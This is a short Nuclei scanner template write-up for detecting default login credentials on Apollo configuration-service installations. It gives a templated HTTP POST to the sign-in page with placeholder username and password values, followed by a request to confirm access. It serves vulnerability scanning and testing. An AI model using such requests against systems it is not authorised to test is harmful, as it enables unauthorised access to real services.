# Nuclei Template: Apollo Default Login
**Template ID:** apollo-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`apollo-default-login.yaml`)

## Vulnerability Information & PoC

## Description
An Apollo default login was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /signin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/signin?

username={{user}}&password={{pass}}&login-submit=Login

GET /user HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/apolloconfig/apollo
